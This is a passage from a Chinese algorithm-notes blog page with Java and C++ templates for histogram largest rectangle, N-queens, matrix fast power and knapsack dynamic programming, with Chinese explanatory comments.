"</span>+humble[n]+<span class="string">"."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="相邻图形面积问题-Adjacent-Graphics-Area"><a href="#相邻图形面积问题-Adjacent-Graphics-Area" class="headerlink" title="相邻图形面积问题|Adjacent Graphics Area"></a>相邻图形面积问题|Adjacent Graphics Area</h3><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201027165335069.png" alt="image-20201027165335069"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*解法的核心在于考虑了直方图两个相邻长方形AB之间的关系。如果前一个长方形A低后一个长方形B高，则A肯定不会是某个大长方形的终点，因为我们可以安全地在A后面添加更高的B，使大长方形的宽度加1。如果A高B低，则A是可能的终点，假设我们就用A当做终点，并且以该长方形的高度当做大长方形的高度，看看可以往前延伸多长。根据上面这两条性质，我们可以维护一个递增序列（实际为非递减，当前后两个长方形的高度一样时，前一个长方形同样也不可能是终点，在此为了解释方便假定前后高度都不一样），*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> N = <span class="number">100010</span>;<span class="comment">//</span></span><br><span class="line"><span class="comment">//static float [] dp = new float [N];</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> [] height = <span class="keyword">new</span> <span class="keyword">int</span> [N];</span><br><span class="line"><span class="comment">//static float per[]=new float [N+1];</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner in = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> BufferedInputStream(System.in));</span><br><span class="line">Stack&lt;Integer&gt; stk = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line"><span class="keyword">int</span> i,j,res;</span><br><span class="line"><span class="keyword">while</span>(in.hasNext())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> sum=in.nextInt();</span><br><span class="line"><span class="keyword">if</span>(sum==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">stk.removeAllElements();</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=sum;i++)</span><br><span class="line">&#123;</span><br><span class="line">height[i]=in.nextInt();</span><br><span class="line">&#125;</span><br><span class="line">height[sum+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=sum;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(stk.isEmpty()||height[stk.peek()]&lt;=height[i])</span><br><span class="line">stk.push(i);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> temp=stk.pop();</span><br><span class="line">res=Math.max(res, height[temp]*(stk.isEmpty()?i-<span class="number">1</span>:i-stk.peek()-<span class="number">1</span>));</span><br><span class="line">--i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(res);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="皇后问题-N-queen"><a href="#皇后问题-N-queen" class="headerlink" title="皇后问题|N-queen"></a>皇后问题|N-queen</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;  </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>,g;</span><br><span class="line">a[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">g = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = i - <span class="number">1</span>; k &gt;= <span class="number">1</span>; k--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[k] == a[i] || <span class="built_in">abs</span>(a[i] - a[k]) == i - k)</span><br><span class="line">g = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (g&amp;&amp;i == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i &lt; <span class="number">4</span> &amp;&amp; g) &#123; i++; a[i] = <span class="number">1</span>; <span class="keyword">continue</span>; &#125;</span><br><span class="line"><span class="keyword">while</span> (a[i] == <span class="number">4</span> &amp;&amp; i &gt; <span class="number">1</span>) i--;</span><br><span class="line"><span class="keyword">if</span> (a[i] == <span class="number">4</span> &amp;&amp; i == <span class="number">1</span>)<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span> a[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩阵快速幂-Matrix-fast-power"><a href="#矩阵快速幂-Matrix-fast-power" class="headerlink" title="矩阵快速幂|Matrix fast power"></a>矩阵快速幂|Matrix fast power</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">问题描述</span></span><br><span class="line"><span class="comment">　　已知递推公式：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">　　F(n, 1)=F(n-1, 2) + 2F(n-3, 1) + 5,</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">　　F(n, 2)=F(n-1, 1) + 3F(n-3, 1) + 2F(n-3, 2) + 3.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">　　初始值为：F(1, 1)=2, F(1, 2)=3, F(2, 1)=1, F(2, 2)=4, F(3, 1)=6, F(3, 2)=5。</span></span><br><span class="line"><span class="comment">　　输入n，输出F(n, 1)和F(n, 2)，由于答案可能很大，你只需要输出答案除以99999999的余数。</span></span><br><span class="line"><span class="comment">输入格式</span></span><br><span class="line"><span class="comment">　　输入第一行包含一个整数n。</span></span><br><span class="line"><span class="comment">输出格式</span></span><br><span class="line"><span class="comment">　　输出两行，第一行为F(n, 1)除以99999999的余数，第二行为F(n, 2)除以99999999的余数。</span></span><br><span class="line"><span class="comment">样例输入</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">样例输出</span></span><br><span class="line"><span class="comment">14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">21</span></span><br><span class="line"><span class="comment">数据规模和约定</span></span><br><span class="line"><span class="comment">　　1&lt;=n&lt;=10^18</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;  </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;  </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;  </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">99999999</span>;  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">matrix</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">    ll a[<span class="number">8</span>][<span class="number">8</span>];  </span><br><span class="line">&#125;;  </span><br><span class="line"><span class="function">matrix <span class="title">multiply</span><span class="params">(matrix x,matrix y,<span class="keyword">int</span> m,<span class="keyword">int</span> n,<span class="keyword">int</span> s)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    matrix tmp;  </span><br><span class="line">    <span class="built_in">memset</span>(tmp.a,<span class="number">0</span>,<span class="keyword">sizeof</span>(tmp.a));  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;  </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;  </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;s;k++)&#123;  </span><br><span class="line">                tmp.a[i][j]=(tmp.a[i][j] + (x.a[i][k] * y.a[k][j])%mod)%mod;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> tmp;  </span><br><span class="line">&#125;  </span><br><span class="line">matrix tmp=&#123;  </span><br><span class="line">                <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,  </span><br><span class="line">                <span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,  </span><br><span class="line">                <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,  </span><br><span class="line">                <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,  </span><br><span class="line">                <span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,  </span><br><span class="line">                <span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,  </span><br><span class="line">                <span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,  </span><br><span class="line">                <span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>  </span><br><span class="line">            &#125;;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">    matrix res;  </span><br><span class="line">    ll f[<span class="number">8</span>]=&#123;<span class="number">6</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">3</span>&#125;;  <span class="comment">//由f(n-1,1),f(n-1),2......f(n-3,1)..</span></span><br><span class="line"><span class="comment">//假设n=4，则比例为f(3,1)....f(1,2)，比例则为651423，最后两个常数5,3</span></span><br><span class="line">    ll sum1,sum2,n;  </span><br><span class="line">    <span class="built_in">memset</span>(res.a,<span class="number">0</span>,<span class="keyword">sizeof</span>(res.a));  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;  </span><br><span class="line">        res.a[i][i]=<span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;  </span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)  </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"2"</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"3"</span>&lt;&lt;<span class="built_in">endl</span>;  </span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>)  </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"1"</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"4"</span>&lt;&lt;<span class="built_in">endl</span>;  </span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">3</span>)  </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"6"</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"5"</span>&lt;&lt;<span class="built_in">endl</span>;  </span><br><span class="line">    <span class="keyword">if</span>(n&gt;=<span class="number">4</span>)&#123;  </span><br><span class="line">        n-=<span class="number">3</span>;  </span><br><span class="line">        <span class="keyword">while</span>(n) <span class="comment">//矩阵快速幂   </span></span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">if</span>(n&amp;<span class="number">1</span>) res=multiply(res,tmp,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>);  </span><br><span class="line"><span class="comment">//&amp;是位与操作符，n&amp;1,不将n的二进制形式与00000000 00000001按位做与操作。这时，只 //要//n的最右边一位是1，结果就不是0，为true，条件成立。所以这句话实际上就是if(n%2==1)</span></span><br><span class="line">            n&gt;&gt;=<span class="number">1</span>;  </span><br><span class="line">            tmp=multiply(tmp,tmp,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        sum1=<span class="number">0</span>;  </span><br><span class="line">        sum2=<span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            sum1=(sum1+(f[i]*res.a[i][<span class="number">0</span>])%mod)%mod;  </span><br><span class="line">            sum2=(sum2+(f[i]*res.a[i][<span class="number">1</span>])%mod)%mod;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;sum1&lt;&lt;<span class="built_in">endl</span>;  </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;sum2&lt;&lt;<span class="built_in">endl</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="动态规划-Dynamic-Planning"><a href="#动态规划-Dynamic-Planning" class="headerlink" title="动态规划|Dynamic Planning"></a>动态规划|Dynamic Planning</h3><h4 id="01背包-01-Pack"><a href="#01背包-01-Pack" class="headerlink" title="01背包|01 Pack"></a>01背包|01 Pack</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//背包问题：有m件物品和一个承重为t的背包。第i件物品的重量是w[i]，价值是v[i]。</span></span><br><span class="line"><span class="comment">//求解将哪些物品装入背包可使这些物品的重量总和不超过背包承重量t，且价值总和最大。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> f[<span class="number">1010</span>],w[<span class="number">1010</span>],v[<span class="number">1010</span>];<span class="comment">//f记录不同承重量背包的总价值，w记录不同物品的重量，v记录不同物品的价值</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;<span class="comment">//返回x,y的最大值</span></span><br><span class="line">    <span class="keyword">if</span>(x&gt;y) <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t,m,i,j;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));  <span class="comment">//总价值初始化为0</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;t,&amp;m);  <span class="comment">//输入背包承重量t、物品的数目m</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;w[i],&amp;v[i]);  <span class="comment">//输入m组物品的重量w[i]和价值v[i]</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=m;i++)&#123;  <span class="comment">//尝试放置每一个物品</span></span><br><span class="line">        <span class="keyword">for</span>(j=t;j&gt;=w[i];j--)&#123;</span><br><span class="line">            f[j]=<span class="built_in">max</span>(f[j-w[i]]+v[i],f[j]);</span><br><span class="line">            <span class="comment">//在放入第i个物品前后，检验不同j承重量背包的总价值，如果放入第i个物品后比放入前的价值提高了，则修改j承重量背包的价值，否则不变</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,f[t]);  <span class="comment">//输出承重量为t的背包的总价值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="多重背包-Multiple-Pack"><a href="#多重背包-Multiple-Pack" class="headerlink" title="多重背包|Multiple Pack"></a>多重背包|Multiple Pack</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">102</span>];</span><br><span class="line"><span class="keyword">int</span> p[<span class="number">102</span>],h[<span class="number">102</span>],c[<span class="number">102</span>];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">comback</span><span class="params">(<span class="keyword">int</span> v,<span class="keyword">int</span> w)</span><span class="comment">//经费，重量。完全背包；</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=v; i&lt;=n; i++)</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&lt;dp[i-v]+w)</span><br><span class="line">            dp[i]=dp[i-v]+w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">oneback</span><span class="params">(<span class="keyword">int</span> v,<span class="keyword">int</span> w)</span><span class="comment">//经费，重量；01背包；</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n; i&gt;=v; i--)</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&lt;dp[i-v]+w)</span><br><span class="line">            dp[i]=dp[i-v]+w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ncase,i,j,k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;ncase);</span><br><span class="line">    <span class="keyword">while</span>(ncase--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);<span class="comment">//经费，种类；</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;p[i],&amp;h[i],&amp;c[i]);<span class="comment">//价值，重量，数量;</span></span><br><span class="line">            <span class="keyword">if</span>(p[i]*c[i]&gt;=n) comback(p[i],h[i]);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(j=<span class="number">1</span>; j&lt;c[i]; j&lt;&lt;<span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    oneback(j*p[i],j*h[i]);</span><br><span class="line">                    c[i]=c[i]-j;</span><br><span class="line">                &#125;</span><br><span class="line">                oneback(p[i]*c[i],h[i]*c[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dp[n]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="速记-note"><a href="#速记-note" class="headerlink" title="速记|note"></a>速记|note</h4><p>完全背包:在当前体积下，是否要放入或者再放入一个当前物品i</p><p>01背包: 在当前体积下，是否要放入当前物品i</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们在做0-1背包，计算dp[i][j]的时候，需要用到前面的值，而这个值是前i-1个物品的值（相当于更新前i-1个物品的值）.</span><br><span class="line">  </span><br><span class="line">做完全背包，计算dp[j]时，我们需要更新的是当前状态，也就是前i个物品的值.(也就是说：用前i-1个的值和当前值比较，更新当前值).</span><br><span class="line">  </span><br><span class="line">可以这样理解:01背包是基于前一个物品的角度上考虑，考虑他是否需要放入当前的物品，而由于当前的物品只有一个，又因为我们要参考前一个背包的状态，故而需要倒序。</span><br><span class="line">而完全背包，有无限种可选，也即是，并非我这次选了，前面的就绝不可能一次没选过（可能选过，也可能没选），因而基于前面的状态也就没有意义了，那么就基于当前的状态来考虑，比如拿一次当前的物品，再拿一次当前的物品，等等等等。每次发生变化后都进行比较更新。</span><br></pre></td></tr></table></figure><h4 id="概率DP"><a href="#概率DP" class="headerlink" title="概率DP"></a>概率DP</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 